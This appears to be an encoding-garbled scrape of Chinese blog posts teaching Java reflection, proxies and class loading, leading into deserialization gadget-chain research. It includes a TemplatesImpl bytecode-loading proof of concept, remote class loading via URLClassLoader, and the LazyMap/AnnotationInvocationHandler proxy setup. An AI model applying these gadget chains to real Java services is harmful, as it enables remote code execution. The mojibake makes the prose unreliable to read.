è®ºè¢«é‡å†™çš„æ–¹æ³•æ˜¯å¦æŠ›å‡ºå¼‚å¸¸ã€‚ä½†æ˜¯ï¼Œé‡å†™çš„æ–¹æ³•ä¸èƒ½æŠ›å‡ºæ–°çš„å¼ºåˆ¶æ€§å¼‚å¸¸ï¼Œæˆ–è€…æ¯”è¢«é‡å†™æ–¹æ³•å£°æ˜çš„æ›´å¹¿æ³›çš„å¼ºåˆ¶æ€§å¼‚å¸¸ï¼Œåä¹‹åˆ™å¯ä»¥ã€‚ æ„é€ æ–¹æ³•ä¸èƒ½è¢«é‡å†™ã€‚ å¦‚æœä¸èƒ½ç»§æ‰¿ä¸€ä¸ªç±»ï¼Œåˆ™ä¸èƒ½é‡å†™è¯¥ç±»çš„æ–¹æ³•ã€‚ ##javaåå°„###åå°„åŸºæœ¬æ¦‚å¿µå®˜æ–¹æ¦‚å¿µï¼šJAVAåå°„æœºåˆ¶æ˜¯åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼›å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•ï¼Œè¿™ç§åŠ¨æ€è·å–ã€è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸ºjavaè¯­è¨€çš„åå°„æœºåˆ¶ã€‚ åå°„æ˜¯é€šè¿‡Classå¯¹è±¡(å­—èŠ‚ç æ–‡ä»¶)ï¼Œæ¥çŸ¥é“æŸä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯è¯´é€šè¿‡åå°„æˆ‘ä»¬å¯ä»¥è·å–æ„é€ å™¨ï¼Œå¯¹è±¡ï¼Œå±æ€§ï¼Œæ–¹æ³•ï¼ˆåŸæœ¬ä¸çŸ¥é“ï¼‰æˆ‘çš„ç†è§£ï¼šå°±æ˜¯è·å–å®ä¾‹åŒ–å¯¹è±¡çš„åŸæœ¬çš„classã€‚é‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬è·å–åˆ°ä»–åŸæœ¬çš„classä»¥åï¼Œæƒ³è¦è·å–å…¶å±æ€§ï¼Œæ–¹æ³•å°±å¾ˆå®¹æ˜“äº†ã€‚###è·å–Classå¯¹è±¡####é€šè¿‡è¯¥ç±»çš„å¯¹è±¡è·å–å¯¹åº”çš„Classå¯¹è±¡ public static void main(String[] args) throws Exception{ person p=new person(&quot;test&quot;); Class a = p.getClass(); System.out.println(a);} ####é€šè¿‡ç±»å.classé™æ€å±æ€§ Class stuClass2 = Student.class;System.out.println(&quot;æ˜¯å¦ä¸ºåŒä¸€ä¸ªclasså¯¹è±¡?&quot;+(stuClass==stuClass2)); è™½ç„¶æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯éœ€è¦å¯¼åŒ…ï¼Œä¸ç„¶ä¼šç¼–è¯‘é”™è¯¯####é€šè¿‡Classç±»ä¸­çš„é™æ€æ–¹æ³•forName()æ–¹æ³•è·å– public static void main(String[] args) throws Exception{ person p=new person(&quot;test&quot;); Class a =Class.forName(&quot;person&quot;); System.out.println(a);} ###è·å–æœ‰å‚æ„é€ æ–¹æ³•####getConstructor() public Constructor&lt;T&gt; getConstructor(Class&lt;?&gt;... parameterTypes) throws NoSuchMethodException, SecurityException { checkMemberAccess(Member.PUBLIC, Reflection.getCallerClass(), true); return getConstructor0(parameterTypes, Member.PUBLIC);} è¿™é‡Œè§£é‡Šä¸€ä¸‹ï¼Œ1.é¦–å…ˆä¼ å‡ºçš„ç±»å‹å’ŒConstructoræœ‰å…³ï¼Œè¿™ä¸ª&lt;T&gt;æŒ‡çš„æ˜¯æ³›å‹ï¼Œæ„æ€æ˜¯ä¼ å…¥çš„ç±»å‹åˆå³è¾¹çš„æ•°æ®ç±»å‹å†³å®š2.åé¢å¯ä»¥å‘ç°ï¼Œä»–ä¼ å…¥çš„æ•°æ®ç±»å‹è¦æ±‚æ˜¯ä¸€ä¸ªclassç±»ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿™é‡Œå…¶å®å¯ä»¥è¿™æ ·æ„é€  import java.io.*;import java.lang.reflect.Constructor;public class Main { public static void serialize(final Object obj) throws Exception{ ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); objectOutputStream.writeObject(obj); } public static void main(String[] args) throws Exception{ person p=new person(&quot;test&quot;); Class a =Class.forName(&quot;person&quot;); Constructor personconstructor=a.getConstructor(String.class); person pe1=(person) personconstructor.newInstance(&quot;aaa&quot;); System.out.println(pe1); }} æœ‰å‡ ä¸ªç‚¹è§£é‡Šä¸€ä¸‹ï¼š newInstance() æ˜¯javaåå°„æ¡†æ¶ä¸­ç±»å¯¹è±¡(Class)åˆ›å»ºæ–°å¯¹è±¡çš„æ–¹æ³• ç°åœ¨è·å–åˆ°personè¿™ä¸ªåŸå‹Classï¼Œç„¶åæˆ‘ä»¬æƒ³è¦å®ä¾‹åŒ–å¯¹è±¡å‡ºæ¥ï¼ˆä¹Ÿå°±æ˜¯åˆ©ç”¨ï¼‰ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥å•çº¯ä½¿ç”¨newInstance,ä½†æ˜¯è¿™æ ·çš„è¯ï¼Œæ­¤æ—¶è°ƒç”¨çš„æ˜¯personç±»çš„æ— å‚æ„é€ æ–¹æ³•public static void main(String[] args) throws Exception{ person p=new person(&quot;test&quot;); Class a =Class.forName(&quot;person&quot;); person pe1=(person) a.newInstance();} å¯ä»¥ä½¿ç”¨getConstructorè·å–å…¶æœ‰å‚æ„é€ æ–¹æ³•ï¼Œè€Œé‡Œé¢çš„å‚æ•°ç”±äºè¦æ±‚å†™çš„æ˜¯ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å†™æ³•æ˜¯String.class,å³é€šè¿‡ç±»å.classé™æ€å±æ€§è·å–å…¶åŸå‹Classè¿›è¡Œç©¿å‚å†™å…¥ æ¥ä¸‹æ¥å†ä½¿ç”¨newInstanceåˆ›å»ºçš„å°±æ˜¯æœ‰å‚çš„å¯¹è±¡äº†###è·å–ç±»é‡Œé¢çš„å±æ€§####getFields()&amp;getDeclaredFields()è¿™ä¸¤ä¸ªå°±æ˜¯æ‰“å°å½“å‰ç±»é‡Œé¢çš„æ‰€æœ‰å±æ€§,ä½†æ˜¯åŠ ä¸ŠDeclaredä»¥åå…¶ç§æœ‰å±æ€§ä¹Ÿå°†ä¼šè¢«æ‰“å°å‡ºæ¥ public static void main(String[] args) throws Exception{ person p=new person(&quot;test&quot;,22); Class a =Class.forName(&quot;person&quot;);// Constructor personconstructor=a.getConstructor(String.class);// person pe1=(person) personconstructor.newInstance(&quot;aaa&quot;);// System.out.println(pe1); person pe1=(person) a.newInstance(); Field[] persof=a.getFields(); // Field[] persof=a.getDeclaredFields(); for(Field f:persof){ System.out.println(f); } } ####getField()&amp;getDeclaredField() æ›´æ”¹publicå±æ€§ï¼š public static void main(String[] args) throws Exception{ person p=new person(&quot;test&quot;,22); Class a =Class.forName(&quot;person&quot;);// Constructor personconstructor=a.getConstructor(String.class);// person pe1=(person) personconstructor.newInstance(&quot;aaa&quot;);// System.out.println(pe1); //person pe1=(person) a.newInstance(); Field persof=a.getField(&quot;age&quot;); // Field[] persof=a.getDeclaredFields();// for(Field f:persof){// System.out.println(f);// } persof.set(p,23); System.out.println(p); } ä½¿ç”¨setè¿›è¡Œèµ‹å€¼æ“ä½œï¼Œå¯ä»¥çœ‹åˆ°ä»–çš„å‚æ•°ä¸ºobjå’Œvalueï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œèµ‹å€¼æ“ä½œ æ›´æ”¹privateå±æ€§ï¼š public static void main(String[] args) throws Exception{ person p=new person(&quot;test&quot;,22); Class a =Class.forName(&quot;person&quot;);// Constructor personconstructor=a.getConstructor(String.class);// person pe1=(person) personconstructor.newInstance(&quot;aaa&quot;);// System.out.println(pe1); //person pe1=(person) a.newInstance(); Field persof=a.getDeclaredField(&quot;name&quot;); persof.setAccessible(true); // Field[] persof=a.getDeclaredFields();// for(Field f:persof){// System.out.println(f);// } Field persof1=a.getField(&quot;age&quot;); persof.set(p,&quot;aaa&quot;); persof1.set(p,25); System.out.println(p); } åªéœ€è¦ä½¿ç”¨getDeclaredFieldï¼Œå¹¶ä¸”åŠ ä¸ŠsetAccessible(true)###è·å–ç±»çš„æ–¹æ³•####getDeclaredMethod()/getMethod() Method perMethod=a.getMethod(&quot;getName&quot;);System.out.println(perMethod.invoke(p)) å’Œä¸Šé¢è·å–å±æ€§çš„ç”¨æ³•ç±»ä¼¼ è¿™é‡Œéœ€è¦ä½¿ç”¨invokeæ¥å¯åŠ¨è¿™ä¸ªæ–¹æ³• è°ƒç”¨æœ‰å‚æ–¹æ³•ï¼Œéœ€è¦å†™æ¸…æ¥šç±»å‹ Method perMethod=a.getMethod(&quot;getName&quot;, String.class);System.out.println(perMethod.invoke(p,&quot;abcd&quot;)); è·å–privateæ–¹æ³•ï¼Œä¹Ÿåªéœ€è¦åŠ ä¸ŠperMethod.setAccessible(true)å³å¯è§¦å‘##javaä»£ç†###javaé™æ€ä»£ç†è‹¥ç±»ä¸­æ–¹æ³•è¾ƒå¤šï¼Œåˆ™é™æ€ä»£ç†ç±»ä¸­éœ€è¦é‡å†™çš„æ–¹æ³•ä¹Ÿè¾ƒå¤š public class UserProxy implements IUser { IUser user; public UserProxy(){} public UserProxy(IUser user){this.user = user;} @Override public void show() { user.show(); System.out.println(&quot;è°ƒç”¨äº†show&quot;); }} ###javaåŠ¨æ€ä»£ç†####æ„é€ è¿‡ç¨‹demomain.java: public class ProxyTest { public static void main(String[] args) { IUser user=new UserImpl(); //user.show(); //é™æ€ä»£ç†// IUser userproxy = new UserProxy();// userproxy.show(); InvocationHandler userInvocationHandler = new UserInvocationHandler(user); IUser userproxy = (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(),userInvocationHandler); userproxy.show(); }} UserinvocationHandler: import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class UserInvocationHandler implements InvocationHandler { IUser user; public UserInvocationHandler(IUser user){ this.user = user; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { method.invoke(user,args); return null; }} åŠ¨æ€ä»£ç†åˆ©ç”¨çš„æ˜¯javaä¸­çš„Proxyç±»æ¥è¿›è¡Œä»£ç†ï¼Œå…¶å‚æ•°ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œå…¶ä¸­æœ€ä¸»è¦çš„æ˜¯è¦è‡ªå®šä¹‰ä¸€ä¸ªInvocationHandlerï¼Œå¹¶é€šè¿‡é‡å†™å…¶invokeæ–¹æ³•æ¥è¿›è¡ŒåŠ¨æ€ä»£ç†è°ƒç”¨ï¼Œä»è€Œå¼¥è¡¥é™æ€ä»£ç†è¿‡ç¨‹ä¸­å¦‚æœæœ‰å¤šä¸ªæ–¹æ³•ï¼Œéœ€è¦é‡å†™å¤šä¸ªæ–¹æ³•çš„ç¼ºé™· åŠ¨æ€ä»£ç†ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œé™¤äº†ä¸€å¼€å§‹åˆ›å»ºInvocationHandlerçš„æ—¶å€™è°ƒç”¨çš„æ˜¯InvocationHandleræ¥å£ï¼Œå…¶ä»–çš„éƒ½æ˜¯å±äºä½ æ‰€è¦è°ƒç”¨çš„ç±»çš„æ¥å£ï¼Œä¾‹å¦‚è¿™ä¸ªdemoä¸­æ˜¯IUser,æ‰€ä»¥åé¢å†™çš„éƒ½æ˜¯IUser####æ„ä¹‰ä»£ç†çš„æ„ä¹‰ï¼Œå…¶å®å°±æ˜¯ä¸ä¿®æ”¹åŸæœ‰çš„ç±»ï¼Œä½†æ˜¯å¢åŠ äº†å…¶åŠŸèƒ½##javaç±»åŠ è½½æœºåˆ¶###ç±»åŠ è½½çš„æ—¶å€™ä¼šæ‰§è¡Œä»£ç æƒ…å†µåˆå§‹åŒ–ï¼šé™æ€ä»£ç å—å®ä¾‹åŒ–ï¼šæ„é€ ä»£ç å—ï¼Œæ— å‚æ„é€ å‡½æ•°####åŠ¨æ€ç±»åŠ è½½æ–¹æ³•Classloaderå°†å­—èŠ‚æµåŠ è½½åˆ°å†…å­˜ï¼Œå¹¶ä½¿ç”¨defineClassåŠ è½½åˆ°JVMç”Ÿæˆå¯ä»¥è¢«è°ƒç”¨çš„ç±»ã€‚Javaæºç ç¼–è¯‘ä¹‹åç”Ÿæˆå¯¹åº”çš„å­—èŠ‚ç ï¼Œå­—èŠ‚ç çš„å­˜å‚¨å½¢å¼ä¸åªå±€é™äºæ–‡ä»¶ï¼Œè¿˜å¯ä»¥ä½¿ç”¨è®¿é—®æ•°æ®åº“ï¼ŒURLè¯·æ±‚çš„æ–¹å¼è¿›è¡Œè·å–ã€‚å­˜å‚¨çš„å­—èŠ‚ç è¿˜å¯ä»¥ä½¿ç”¨åŠ å¯†ç®—æ³•è¿›è¡ŒåŠ å¯†ï¼Œæé«˜å­˜å‚¨å®‰å…¨æ€§ 1.Class.forName ä¸èƒ½åŠ è½½åŸç”Ÿç±»å‹ï¼Œä½†å…¶ä»–ç±»å‹éƒ½æ˜¯æ”¯æŒçš„ 2.Classloader.loadclass ä¸èƒ½åŠ è½½åŸç”Ÿç±»å‹å’Œæ•°ç»„ç±»å‹ï¼Œå…¶ä»–ç±»å‹éƒ½æ˜¯æ”¯æŒçš„Class.fornameClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoader LoadClass-&gt;findClass(é‡å†™çš„æ–¹æ³•)-&gt;defineClass(ä»å­—èŠ‚ç åŠ è½½ç±») public class LoadClassTest { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(&quot;&quot;)} ); Class&lt;?&gt; c = urlClassLoader.loadClass(&quot;Hello&quot;); c.newInstance(); }} defineClassé‡è½½åŠ è½½å­—èŠ‚ç  public class LoadClassTest { public static void main(String[] args) throws NoSuchMethodException, IOException, InvocationTargetException, IllegalAccessException, InstantiationException { ClassLoader cl = ClassLoader.getSystemClassLoader(); Method defineClassMethod= ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&quot;Classæ–‡ä»¶è·¯å¾„&quot;)); Class c = (Class) defineClassMethod.invoke(cl,&quot;è¦åŠ è½½çš„ç±»çš„åç§°&quot;,code,0,code.length); c.newInstance(); }} unsafeå®ç°åŠ¨æ€ç±»åŠ è½½ Class c = Unsafe.class;Field theUnsafeField = c.getDeclaredField(&quot;theUnsafe&quot;);theUnsafeField.setAccess","link":"/2022/12/02/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"title":"java-å­—èŠ‚ç ","text":"ä»€ä¹ˆæ˜¯å­—èŠ‚ç å…¶å®ä»…ä»…æŒ‡çš„æ˜¯Javaè™šæ‹Ÿæœºæ‰§è¡Œä½¿ç”¨çš„ä¸€ç±»æŒ‡ä»¤ï¼Œé€šå¸¸è¢«å­˜å‚¨åœ¨.classæ–‡ä»¶ä¸­ æ›´å¹¿ä¹‰ä¸Šæ¥è¯´ï¼Œæ‰€æœ‰èƒ½æ¢å¤æˆä¸€ä¸ªç±»å¹¶åœ¨jvmè™šæ‹Ÿæœºé‡ŒåŠ è½½çš„å­—èŠ‚åºåˆ—ï¼Œéƒ½åœ¨æˆ‘ä»¬çš„æ¢è®¨èŒƒå›´å†…ã€‚ åˆ©ç”¨URLClassLoaderåŠ è½½è¿œç¨‹classæ–‡ä»¶ClassLoader: â€‹ æ˜¯ç”¨æ¥åŠ è½½å­—èŠ‚ç æ–‡ä»¶æœ€åŸºç¡€çš„æ–¹æ³•ï¼Œæ˜¯ä¸€ä¸ªåŠ è½½å™¨ï¼Œå‘Šè¯‰javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ï¼Œjavaé»˜è®¤çš„ClassLoaderå°±æ˜¯æ ¹æ®ç±»åæ¥åŠ è½½ç±»ï¼Œï¼Œå¹¶ä¸”ç±»åæ˜¯ç±»å®Œæ•´è·¯å¾„ï¼Œå¦‚java.lang.Runtimeã€‚ URLClassLoaderURLClassLoaderå®é™…ä¸Šæ˜¯æˆ‘ä»¬å¹³æ—¶é»˜è®¤ä½¿ç”¨çš„AppClassLoaderçš„çˆ¶ç±»ï¼Œæ‰€ä»¥ï¼ŒURLClassLoader=javaç±»åŠ è½½å™¨çš„å·¥ä½œæµç¨‹ æ­£å¸¸æƒ…å†µä¸‹ï¼ŒJavaä¼šæ ¹æ®é…ç½®é¡¹sun.boot.class.pathå’Œjava.class.pathä¸­åˆ—ä¸¾åˆ°çš„åŸºç¡€è·¯å¾„ï¼ˆè¿™äº›è·¯å¾„æ˜¯ç»è¿‡å¤„ç†åçš„java.net.URLç±»ï¼‰æ¥å¯»æ‰¾.classæ–‡ä»¶æ¥åŠ è½½ï¼Œè€Œè¿™ä¸ªåŸºç¡€è·¯å¾„æœ‰ä¸‰ç§æƒ…å†µ: URLæœªä»¥æ–œæ /ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨JarLoaderæ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯»æ‰¾.classæ–‡ä»¶ URLä»¥æ–œæ /ç»“å°¾ï¼Œä¸”åè®®åæ˜¯fileï¼Œåˆ™ä½¿ç”¨FileLoaderæ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾.classæ–‡ä»¶ URLä»¥æ–œæ /ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯fileï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„Loaderæ¥å¯»æ‰¾ç±»ã€‚ javaçš„URLæ”¯æŒå“ªäº›åè®®JAVAé»˜è®¤æä¾›äº†å¯¹file,ftp,gopher,http,https,jar,mailto,netdocåè®®çš„æ”¯æŒ Loaderå¯»æ‰¾ç±»loaderå¯»æ‰¾ç±»ï¼Œæœ€å¸¸è§çš„æƒ…å†µå°±æ˜¯httpåè®®ã€‚ import java.net.URL;import java.net.URLClassLoader;public class classloader { public static void main(String[] args ) throws Exception { URL[] urls={new URL(&quot;http://localhost:8000/&quot;)}; URLClassLoader loader = URLClassLoader.newInstance(urls); Class c =loader.loadClass(&quot;ex_1&quot;); c.newInstance(); }} åˆ©ç”¨ClassLoader#defineClassç›´æ¥åŠ è½½å­—èŠ‚ç javaåŠ è½½è¿œç¨‹classæ–‡ä»¶/æœ¬åœ°classæˆ–jaræ–‡ä»¶ ClassLoader#loadClass â€”â€”&gt; ClassLoader#findClass â€”â€”&gt;ClassLoader#defineClass å…¶ä¸­: Loadclassçš„ä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ï¼Œçˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆåŒäº²å§”æ´¾æœºåˆ¶ï¼‰ findClassçš„ä½œç”¨æ˜¯æ ¹æ®åŸºç¡€URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå¯èƒ½ä¼šåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€jaråŒ…ã€æˆ–è¿œç¨‹httpæœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åäº¤ç»™defineClass defineClassçš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†ä¸ºçœŸæ­£çš„javaç±» defineClasså¯ä»¥ä»byte[]è¿˜åŸå‡ºä¸€ä¸ªClasså¯¹è±¡ ä½¿ç”¨defineClassç›´æ¥åŠ è½½å­—èŠ‚ç  import java.lang.reflect.Method;import java.util.Base64;public class defineclass { public static void main(String[] args) throws Exception{ Method defineclass=ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class); defineclass.setAccessible(true); byte[] code=Base64.getDecoder().decode(&quot;å­—èŠ‚ç å†…å®¹&quot;); Class hello = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),&quot;Hello&quot;,code,0,code.length); hello.newInstance(); }} ä½¿ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç TransletClassLoaderTransletClassLoaderæ¥è‡ªcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl å…¶ä¸­é‡å†™äº†defineClassæ–¹æ³• Class defineClass(final byte[] b) { return defineClass(null, b, 0, b.length); } åœ¨é‡å†™çš„è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œç”±äºå…¶æ²¡æœ‰æ˜¾å¼å£°æ˜ä½œç”¨åŸŸï¼Œï¼Œæ‰€ä»¥å…¶ä½œç”¨åŸŸä¸ºdefaultï¼Œæ‰€ä»¥ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œçš„defineClassç”±å…¶çˆ¶ç±»çš„protectedç±»å‹å˜æˆäº†ä¸€ä¸ªdefaultç±»å‹çš„æ–¹æ³•ï¼Œå¯ä»¥è¢«ç±»å¤–éƒ¨è°ƒç”¨ã€‚ è€ŒTransletClassLoader#defineClass()å‘å‰è¿½æº¯è°ƒç”¨é“¾ä¸º TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass() åˆ©ç”¨newTransformer()æ„é€ pocï¼š public static void main(String[] args) throws Exception{ byte[] code = Base64.getDecoder().decode(&quot;&quot;) TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][] {code}); setFieldValue(obj,&quot;_name&quot;,&quot;HelloTemplatesImpl&quot;); setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl()); obj.newTransformer(); } å…¶ä¸­ï¼ŒsetFieldValueæ–¹æ³•æ¥è®¾ç½®ç§æœ‰å±æ€§ï¼Œå…¶ä¸­_bytecodesã€_nameå’Œ_tfactory._bytecodesæ˜¯ç”±å­—èŠ‚ç ç»„æˆçš„æ•°ç»„ï¼›_nameå¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ä¸²ï¼Œåªè¦ä¸ä¸ºnullå³å¯ã€‚ _tfactoryéœ€è¦æ˜¯ä¸€ä¸ªTransformerFactoryImplå¯¹è±¡ï¼Œå› ä¸ºTemplatesImpl#defineTransletClasses()æ–¹æ³•é‡Œæœ‰è°ƒç”¨åˆ°\\_tfactory.getExternalExtensionsMap()å¦‚æœæ˜¯nullä¼šå‡ºé”™ TemplatesImplä¸­å¯¹åŠ è½½çš„å­—èŠ‚ç æœ‰ä¸€å®šè¦æ±‚å³ï¼Œè¿™ä¸ªå­—èŠ‚ç å¯¹åº”çš„ç±»å¿…é¡»æ˜¯com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTransletçš„å­ç±» æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„ç±» import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class HelloTemplatesImpl extends AbstractTranslet { public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {} public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {} public HelloTemplatesImpl() { super(); System.out.println(&quot;Hello TemplatesImpl&quot;); } } å®ƒç»§æ‰¿äº†AbstractTransletç±»ï¼Œå¹¶åœ¨æ„é€ å‡½æ•°é‡Œæ’å…¥Helloçš„è¾“å‡ºï¼Œå°†å…¶ç¼–è¯‘æˆå­—èŠ‚ç ï¼Œå³å¯è¢«TemplatesImplæ‰§è¡Œ åˆ©ç”¨BCEL ClassLoaderåŠ è½½å­—èŠ‚ç package com.govuln; import com.sun.org.apache.bcel.internal.classfile.JavaClass; import com.sun.org.apache.bcel.internal.classfile.Utility; import com.sun.org.apache.bcel.internal.Repository; public class HelloBCEL { public static void main(String []args) throws Exception { JavaClass cls = Repository.lookupClass(evil.Hello.class); String code = Utility.encode(cls.getBytes(), true); System.out.println(code); } }","link":"/2022/09/20/java%E5%AD%97%E8%8A%82%E7%A0%81/"},{"title":"javaå®¡è®¡-lazymap","text":"Lazymapå­¦ä¹ äº†å‰é¢ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨è¿™ä¸ªåˆ©ç”¨é“¾ä¸­ï¼Œæ¯”è¾ƒå…³é”®çš„æ˜¯éœ€è¦æœ‰è°ƒåŠ¨åˆ°transformç±»çš„æ–¹æ³•ï¼Œå› ä¸ºtransformçš„å››ä¸ªæ–¹æ³•ç»„åˆä¸€ä¸‹ï¼Œæœ€ç»ˆæ‰èƒ½æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯åœ¨å‰é¢æˆ‘ä»¬ä½¿ç”¨TransformedMapæ¥æ‰§è¡Œå‘½ä»¤çš„ï¼Œè€Œåœ¨Ysoserialä¸­ä½¿ç”¨çš„æ˜¯lazymapï¼Œå…³é”®çš„ä»£ç åœ¨äºå…¶getæ–¹æ³• public Object get(Object key){ if(map.contain(Key)==false){ Object value = factory.transform(key); map.put(key,value); return value; } return map.get(key) } åˆ©ç”¨æ–¹æ³•åœ¨Lazymapï¼Œæƒ³è¦åˆ©ç”¨è¿™ä¸ªgetæ–¹æ³•ï¼Œéœ€è¦ä½¿ç”¨AnnotationInvocationHandlerç±»çš„invokeæ–¹æ³• javaå¯¹è±¡ä»£ç†ä½œç”¨å®ç°ç±»ä¼¼phpçš„é­”æœ¯æ–¹æ³•_callï¼ŒåŠ«æŒä¸€ä¸ªå¯¹è±¡å†…éƒ¨çš„æ–¹æ³•è°ƒç”¨â€”â€”java.reflect.Proxy Map proxyMap= (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),Class[] {Map.class},handler); ä½¿ç”¨æ–¹æ³•:Proxy.newProxyInstanceçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ClassLoader,ï¼Œé»˜è®¤å³å¯ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯éœ€è¦ä»£ç†çš„å¯¹è±¡çš„é›†åˆï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯å®ç°äº†InvocationHandleræ¥å£çš„å¯¹è±¡ï¼Œé‡Œé¢åŒ…å«å…·ä½“ä»£ç†çš„é€»è¾‘ eg: import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.util.Map;public class ExampleInvocationHandler implements InvocationHandler{ protected Map map; public ExampleInvocationHandler(Map map){ this.map = map; } @Override public Object invoke(Object proxy,Method method, Object[] args) throws Throwable{ if(method.getName().compareTo(&quot;get&quot;)==0){ System.out.println(Method.getName()); return &quot;a&quot;; } return method.invoke(this.map,args); }} ExampleInvocationHandlerç±»å®ç°äº†invokeæ–¹æ³•ï¼Œä½œç”¨æ˜¯æ£€æµ‹åˆ°è°ƒç”¨æ–¹æ³•ågetçš„æ—¶å€™è¿”å›aå’Œæ–¹æ³•å å¤–éƒ¨è°ƒç”¨è¿™ä¸ªExampleInvocationHandler import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map;public class App{ public static void main(String[] args) throws Exception { InvocationHandler handler = new ExampleInvocationHandler(new HashMap()); Map proxyMap=(Map) Proxy.newwPorxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},hander); proxyMap.put(&quot;hello&quot;,&quot;wo&quot;); String result=(String) proxyMap.get(&quot;hello&quot;); System.out.println(result); }} è§¦å‘Lazymapè¿‡ç¨‹1.AnnotationInvocationHandleræ˜¯ä¸€ä¸ªinvocationhandler 2.æˆ‘ä»¬å°†å…¶å¯¹è±¡è¿›è¡Œproxyï¼Œåœ¨ä½¿ç”¨readObjectæ—¶ï¼Œè°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œå³è¿›å…¥invokeæ–¹æ³•ä¸­ï¼Œå°±ä¼šè§¦å‘Lazymap#get LazyMapæ„é€ åˆ©ç”¨é“¾1.ä½¿ç”¨Lazymapæ›¿æ¢TransformedMap Map outerMap = LazyMap.decorate(innerMap, transformerChain); å¯¹sun.reflect.annotation.AnnotationInvocationHandlerå¯¹è±¡è¿›è¡ŒProxyï¼š Class clazz=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor construct=clazz.getDeclaredConstructor(Class.class,Map.class);construct.setAccessible(true);InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class,outerMap);Map proxyMap= (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] 